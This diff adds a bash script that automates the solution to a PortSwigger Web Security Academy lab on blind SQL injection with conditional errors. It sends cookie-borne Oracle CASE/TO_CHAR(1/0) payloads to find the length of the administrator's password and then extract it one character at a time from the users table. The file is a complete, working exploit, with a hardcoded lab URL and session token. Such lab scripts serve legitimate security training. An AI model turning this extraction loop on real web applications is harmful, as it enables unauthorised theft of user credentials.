@@ -1,0 +1,82 @@
+#!/bin/bash
+
+# Lab: Blind SQL injection with conditional errors
+# https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors
+# ...
+# Don't forget to set actual URL and SESSION cookie
+
+url="https://ac981f771f3d068ec14d5c1f000e0049.web-security-academy.net/"
+session="qJHG0hTWjy5qd6CWZOz4ik0RCFOJ8GJJ"
+
+targ_table="users"
+attc_field="password"
+where_cond="WHERE username='administrator'"
+
+word=""
+length=""
+chars=$(echo {0..9} {A..z} \! \? \@ \# \$ \% \& \( \) \_ \- \+ \= \{ \} \[ \] \: \< \> \, \. \\ \| \/ "{?}")
+
+# (<url> <payload> <cook>)
+function attack {
+	local answer=$(
+		curl $1\
+		 -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0'\
+		 -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'\
+		 -H 'Accept-Language: ru,en-US;q=0.7,en;q=0.3'\
+		 --compressed\
+		 -H 'DNT: 1'\
+		 -H 'Connection: keep-alive'\
+		 -H 'Cookie: TrackingId=xxx'"$2"'; session='$3\
+		 -H 'Upgrade-Insecure-Requests: 1'\
+		 -H 'Sec-Fetch-Dest: document'\
+		 -H 'Sec-Fetch-Mode: navigate'\
+		 -H 'Sec-Fetch-Site: none'\
+		 -H 'Sec-Fetch-User: ?1'\
+		 -i -s
+		)
+	echo -n $answer | grep "HTTP/1.1 500 Internal Server Error"
+	echo -n $answer | grep "HTTP/1.1 504 Gateway Timeout"
+}
+
+
+# (<testing length> <target table> <attacked field> <condition>)
+function payload_1 {
+	echo "' || (SELECT CASE WHEN LENGTH($3)<$1 THEN TO_CHAR(1/0) ELSE '' END FROM $2 $4) -- asd"
+}
+
+# (<char> <letter number> <target table> <attacked field> <condition>)
+function payload_2 {
+	echo "' || (SELECT CASE WHEN SUBSTR($4,$2,1)='$1' THEN TO_CHAR(1/0) ELSE '' END FROM $3 $5) -- asd"
+}
+
+
+
+for i in {1..50}
+	do
+		payload=$(payload_1 $i $targ_table $attc_field "$where_cond")
+		result=$(attack $url "$payload" $session)
+		printf "\r"; echo -n "Testing length of [$attc_field]: $(($i-1))"
+		if [ -n "$result" ]
+		then 
+			length=$i-1
+			echo " ... Success!"
+			break
+		fi
+	done
+
+for (( i=1; i<=$length; i++ ))
+	do
+		for char in $chars
+		do
+			payload=$(payload_2 "$char" $i $targ_table $attc_field "$where_cond")
+			result=$(attack $url "$payload" $session)
+			printf "\r"; echo -n "Testing meaning of [$attc_field]: $word$char"
+			if [ -n "$result" ] || [ "$char" = "{?}" ]
+			then 
+				word+=$char
+				break	
+			fi
+		done	
+	done
+echo " ... Done!"
+
